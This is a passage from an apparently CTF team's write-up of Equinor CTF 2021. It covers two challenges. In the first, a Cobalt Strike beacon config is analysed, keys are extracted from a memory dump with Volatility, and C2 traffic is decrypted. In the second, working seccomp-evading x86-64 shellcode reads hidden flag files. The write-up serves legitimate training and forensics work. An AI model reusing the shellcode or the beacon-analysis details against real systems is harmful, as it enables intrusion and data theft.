0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100baaa6b1100ef88c737a50e0f9f86279487a3a838e7e1da5fb1fb1fbcc8b2361207756fa5cfd1fd2c86dc86e32ac73055e7c6da46d13beaa3bc171892fb62e4c90206aaa9c28cb4f9aefc752c9fbc3ae723ed070b0f1dd516b9f75cd4d58a6e61784040d4147ba9fe2c84b9df49e67311dc7999c83772fccab8b7eb78af293135020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0x0008 server,get-uri 0x0003 0x0100 \u0026#39;172.16.32.2,/load\u0026#39; 0x0009 useragent 0x0003 0x0080 \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)\u0026#39; 0x000a post-uri 0x0003 0x0040 \u0026#39;/submit.php\u0026#39; 0x000b Malleable_C2_Instructions 0x0003 0x0100 \u0026#39;\\x00\\x00\\x00\\x04\u0026#39; 0x000c http_get_header 0x0003 0x0100  Cookie 0x000d http_post_header 0x0003 0x0100  \u0026amp;Content-Type: application/octet-stream  id 0x000e SpawnTo 0x0003 0x0010 \u0026#39;\\x92~\\x14√≤¬ªD\\x08\\x89e\\x89\\x92\\x1f`√¥\u0026amp;n\u0026#39; 0x001d spawnto_x86 0x0003 0x0040 \u0026#39;%windir%\\\\syswow64\\\\rundll32.exe\u0026#39; 0x001e spawnto_x64 0x0003 0x0040 \u0026#39;%windir%\\\\sysnative\\\\rundll32.exe\u0026#39; 0x000f pipename 0x0003 0x0080 (NULL ...) 0x001f CryptoScheme 0x0001 0x0002 0 0x0013 DNS_Idle 0x0002 0x0004 0 0.0.0.0 0x0014 DNS_Sleep 0x0002 0x0004 0 0x001a get-verb 0x0003 0x0010 \u0026#39;GET\u0026#39; 0x001b post-verb 0x0003 0x0010 \u0026#39;POST\u0026#39; 0x001c HttpPostChunk 0x0002 0x0004 0 0x0025 license-id 0x0002 0x0004 885300606 0x0026 bStageCleanup 0x0001 0x0002 0 0x0027 bCFGCaution 0x0001 0x0002 0 0x0036 HostHeader 0x0003 0x0080 (NULL ...) 0x0032 UsesCookies 0x0001 0x0002 1 0x0023 proxy_type 0x0001 0x0002 2 IE settings 0x003a 0x0003 0x0080 \u0026#39;\\x00\\x04\u0026#39; 0x0039 0x0003 0x0080 \u0026#39;\\x00\\x04\u0026#39; 0x0037 0x0001 0x0002 0 0x0028 killdate 0x0002 0x0004 0 0x0029 textSectionEnd 0x0002 0x0004 0 0x002b process-inject-start-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002c process-inject-use-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002d process-inject-min_alloc 0x0002 0x0004 0 0x002e process-inject-transform-x86 0x0003 0x0100 (NULL ...) 0x002f process-inject-transform-x64 0x0003 0x0100 (NULL ...) 0x0035 process-inject-stub 0x0003 0x0010 \u0026#39;√íS√ìn\\x83w1\\x98√ºEh√Æ\\x90I?,\u0026#39; 0x0033 process-inject-execute 0x0003 0x0080 \u0026#39;\\x01\\x02\\x03\\x04\u0026#39; 0x0034 process-inject-allocation-method 0x0001 0x0002 0 0x0000 Guessing Cobalt Strike version: 4.2 (max 0x003a) With this we also find 3 HTTP requests that were during the communication (TCP stream 117, 121, and 131).\nWireshark filter: ip.addr == 172.16.32.2 and http.request.uri matches \u0026quot;/submit.php*\u0026quot;.\n\u0026amp; ls ./streams 117.hex 121.hex 131.hex $ cat 117.hex 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f We also find the encrypted metadata blob in a cookie sent in a /load request:\nCookie: dhJBx9uy37Z1YC4YF/ePAKIiFj9mkS7hsd0hwK3DO0vPAkwB/cziZXYPaVJiPFuJlzpLZZKM0Dbi9XwF3bHR76vyPhVKBaRN975ISSNxIjLGNvl6598X2Nop/noEA2ZIo+KWqXC6uRwIPh4EWdI4wlitNy63ye8clGZwbAZAhMY= Dump Memory Of The Infected Process We need to find the process where the beacon was injected, we know that it uses rundll32.exe to inject into a process (spawnto from the beacon configuration), we also note the process injection flag (PAGE_EXECUTE_READWRITE) .\nTo analyze the memory dump, we use the Volatility memory forensics framework. We also know from the challenge description that the provided memory dump was taken from a machine running Windows 10 x64 Build 19043.1237, the closest matching profile for this in Volatility is Win10x64_19041.\nLooking at Volatility\u0026rsquo;s Command Reference for Malware we find the malfind command, which helps find hidden or injected code/DLLs in user mode memory, based on characteristics such as VAD tag and page permissions.\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 malfind We find 2 interesting processes: smartscreen.ex Pid: 5576 and svchost.exe Pid: 3452.\nProcess: svchost.exe Pid: 3452 Address: 0x720000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x0000000000720000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720000 0000 ADD [EAX], AL 0x0000000000720002 0000 ADD [EAX], AL 0x0000000000720004 0000 ADD [EAX], AL 0x0000000000720006 0000 ADD [EAX], AL 0x0000000000720008 0000 ADD [EAX], AL 0x000000000072000a 0000 ADD [EAX], AL 0x000000000072000c 0000 ADD [EAX], AL 0x000000000072000e 0000 ADD [EAX], AL 0x0000000000720010 0000 ADD [EAX], AL 0x0000000000720012 0000 ADD [EAX], AL 0x0000000000720014 0000 ADD [EAX], AL 0x0000000000720016 0000 ADD [EAX], AL 0x0000000000720018 0000 ADD [EAX], AL 0x000000000072001a 0000 ADD [EAX], AL 0x000000000072001c 0000 ADD [EAX], AL 0x000000000072001e 0000 ADD [EAX], AL 0x0000000000720020 0000 ADD [EAX], AL 0x0000000000720022 0000 ADD [EAX], AL 0x0000000000720024 0000 ADD [EAX], AL 0x0000000000720026 0000 ADD [EAX], AL 0x0000000000720028 0000 ADD [EAX], AL 0x000000000072002a 0000 ADD [EAX], AL 0x000000000072002c 0000 ADD [EAX], AL 0x000000000072002e 0000 ADD [EAX], AL 0x0000000000720030 0000 ADD [EAX], AL 0x0000000000720032 0000 ADD [EAX], AL 0x0000000000720034 0000 ADD [EAX], AL 0x0000000000720036 0000 ADD [EAX], AL 0x0000000000720038 0000 ADD [EAX], AL 0x000000000072003a 0000 ADD [EAX], ALZ 0x000000000072003e 0000 ADD [EAX], AL Process: smartscreen.ex Pid: 5576 Address: 0x2491b920000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x000002491b920000 48 89 54 24 10 48 89 4c 24 08 4c 89 44 24 18 4c H.T$.H.L$.L.D$.L 0x000002491b920010 89 4c 24 20 48 8b 41 28 48 8b 48 08 48 8b 51 50 .L$.H.A(H.H.H.QP 0x000002491b920020 48 83 e2 f8 48 8b ca 48 b8 60 00 92 1b 49 02 00 H...H..H.`...I.. 0x000002491b920030 00 48 2b c8 48 81 f9 70 0f 00 00 76 09 48 c7 c1 .H+.H..p...v.H.. --- snip --- We note that both of them have the PAGE_EXECUTE_READWRITE set, which is what we saw in the beacon configuration, so we quickly dump the memory of these processes:\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 3452 $ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 5576 $ ls ./memdumps 3452.dmp 5576.dmp Extract Keys By using cs-extract-key.py we can easily parse these memory dumps and extract the AES keys within them (if they exist).\nThe script will not be able to find any keys if you run it as-is, Didier notes this in his post:\n This method does not always work: the metadata is overwritten after some time, so the process dump needs to be taken quickly after the beacon is started. And there are also cases were this metadata can not be found (I suspect this is version bound).\n The tools includes an options to perform a dictionary attack if you provide it a callback payload. The tool then extracts all possible AES and HMAC keys from the process dump and tries to authenticate and decrypt the callback. The callback payload can be found in TCP stream 117 from the PCAP.\nI somehow messed up this step, but my teammate, @UnblvR, managed to extract the key successfully from the svchost.exe process and decrypt the traffic:\n$ python cs-extract-key.py -c 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f ./memdumps/3452.dmp File: ./memdumps/3452.dmp AES key position: 0x0002a440 AES Key: f55fdb402eb483720fe7ca64f1a8a4cf HMAC key position: 0x0002a450 HMAC Key: ad5584fe824cad1d6b839860c88df785 Side note: My attempts resulted in an empty output, most likely due to the callback being messed up.\nDecrypt C2 Communication The final step is to use these extracted keys to decrypt the C2 communication. This is easily done by using the tool (cs-parse-http-traffic.py) we found earlier. With the Wireshark filter we created earlier we can be sure to only attempt to decrypt the encrypted payloads. After letting the script run for a bit, we finally see the flag in the last decrypted payload (Packet number: 156656).\n$ python cs-parse-http-traffic.py -k ad5584fe824cad1d6b839860c88df785:f55fdb402eb483720fe7ca64f1a8a4cf -Y \u0026#39;ip.addr == 172.16.32.2 and http.request.uri matches \u0026#34;/submit.php*\u0026#34;\u0026#39; LA-FLAMA-BLANCA-20211025-071559.pcap Packet number: 143669 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 2 Callback: 30 UNKNOWN la-flama-blanca\\kennyp  Extra packet data: b\u0026#39;\u0026#39;  Packet number: 156050 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 3 Callback: 30 UNKNOWN User name KennyP Full Name Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 9/29/2021 2:15:34 AM Password expires Never Password changeable 9/29/2021 2:15:34 AM Password required No User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 10/25/2021 12:12:52 AM Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None The command completed successfully. Extra packet data: b\u0026#39;\u0026#39; Packet number: 156656 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 4 Callback: 0 UNKNOWN ---------------------------------------------------------------------------------------------------- flag EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r} Modern\\ SystemShared\\ TIP\\ ---------------------------------------------------------------------------------------------------- Extra packet data: b\u0026#39;\u0026#39; Flag: EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r}\nShellcoding üî• Shellcoding 0x05 üî• This one is a bit different from the others. The flag is in one of 200 files that are randomly created in /opt/flag/. You need to find and print the flag. The files are recreated every minute using the script generateFiles.py which is attached. I\u0026#39;ve also disabled execv and fork syscalls using seccomp. GL HF! :) As the description says, in this challenge the flag is hidden inside 1 out of 200 randomly named files. Moreover, the shellcode is limited to 70 bytes, and the entire directory of random files is regenerated every minute. Syscalls are also severely restricted, to not let us do anything fancy like 2-stage payloads or creating more space.\nvoid disableSyscalls() {  scmp_filter_ctx ctx;  ctx = seccomp_init(SCMP_ACT_ALLOW);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mprotect), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mmap), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(brk), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(munmap), 0);  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mremap), 0);   seccomp_load(ctx);  } The file randomization is done through a Python script, which is using the insecure random module to figure out the names. Exploiting this is a harder problem than just solving the challenge, as we need the outputs in order to predict outputs, so this makes no sense to attack.\nOur general plan is to do something like\nopen(\u0026#34;/opt/flag\u0026#34;) lseek(fd) to skip \u0026#34;.\u0026#34; and \u0026#34;..\u0026#34;\u0026#34; getdents(fd) open(file) sendfile(fd) The string /opt/flag already exists inside the binary through the string \u0026quot;The flag somewhere in /opt/flag\u0026quot;, so that is easy enough.\n/* open(\u0026#34;/opt/flag\u0026#34;) */ pop rdi add di, 2779 mov al, 2 syscall seekdir() just calls lseek() anyways, so let\u0026rsquo;s just go straight to the source and skip a certain number of entries. We dynamically change this OFFSET to a number (explained later), to skip past the uninteresting directory entries in the start. Note that since stdin is closed, the open() syscall is given fd=0.\n/* lseek(0, OFFSET, 0) */ xor eax, eax mov al, 8 xor edi, edi xor esi, esi mov esi, OFFSET xor edx, edx syscall Next up is getdents() to fetch the directory entry from OFFSET into $RSP (valid pointer to the stack), pretending we have 100 bytes to write there.\n/* getdents(0, rsp, 100) */ xor eax, eax mov al, 78 xor edi, edi mov rsi, rsp xor edx, edx mov dl, 100 syscall Now we need to extract the file contents. The structure we just wrote into $RSP looks like this\nstruct linux_dirent {  unsigned long d_ino; /* Inode number */  unsigned long d_off; /* Offset to next linux_dirent */  unsigned short d_reclen; /* Length of this linux_dirent */  char d_name[]; /* Filename (null-terminated) */  /* length is actually (d_reclen - 2 - offsetof(struct linux_dirent, d_name)) */  /* char pad; // Zero padding byte char d_type; // File type (only since Linux // 2.6.4); offset is (d_reclen - 1) */ } and we\u0026rsquo;re only interested in d_name, so we have to skip past the other fields (8+8+2=18 bytes). Let\u0026rsquo;s do openat() and access the potential flag file as a descriptor, so it can be sent with sendfile() later.\n/* openat(linux_dirent-\u0026gt;d_name, 0, 0) */ mov ax, 257 lea rsi, [rsp+18] xor edx, edx syscall The final piece of the exfiltration puzzle, is to actually transfer the contents. sendfile() can do this.\n/* sendfile(1, fd_from_openat, 0, 200) */ mov esi, eax xor eax, eax mov al, 40 xor edi, edi inc edi mov r10b, 200 syscall And that\u0026rsquo;s where we ran out of bytes. We now have the contents of one file, but it will take a long time before the first file will contain the flag file, and since this is a üî•-challenge, time is of the essence. Cue the reason why we made OFFSET a variable. It is possible to combine this script with another one that tells us the offset to the next file.\nThe new code does everything the same way as the previous blocks, except it replaces openat()+sendfile() with this:\n/* write(1, linux_dirent-\u0026gt;d_off, 8) */ xor eax, eax inc eax xor edi, edi inc edi lea rsi, [rsp+8] xor edx, edx mov dl, 8 syscall Which sends us the offset to the next file structure. We can then feed this offset back into the other script to fetch the contents of the next file, then repeat this over and over. It manages to read quite a lot of files before the 1-minute reset happens, so after just a few minutes we get lucky enough to get the flag.\nimport subprocess import sys  curr = eval(sys.argv[1]) if len(sys.argv) \u0026gt; 1 else 0  while True:  soln = subprocess.check_output([\u0026#39;python3\u0026#39;, \u0026#39;get_filedata.py\u0026#39;, str(curr)])  print(repr(soln))  if soln.startswith(b\u0026#39;EPT\u0026#39;):  sys.exit()  off = subprocess.check_output([\u0026#39;python3\u0026#39;, \u0026#39;print_offset.py\u0026#39;, str(curr)])  print(off)  curr = eval(off) After around 9 minutes, the flag is exfiltrated\nFlag: EPT{y0u_ar3_th3_master_0f_sh3llc0de}\n","permalink":"https://bootplug.io/posts/ctf/equinorctf/","summary":"Misc üî• Kalk üî•  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os   class Math(dict):  def __init__(self):  self.e = 0  self.pi = 0   def kalk(src, locals):  if \u0026#39;=\u0026#39; in src:  co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;)  for opc in dis.","title":"Equinor CTF 2021"}]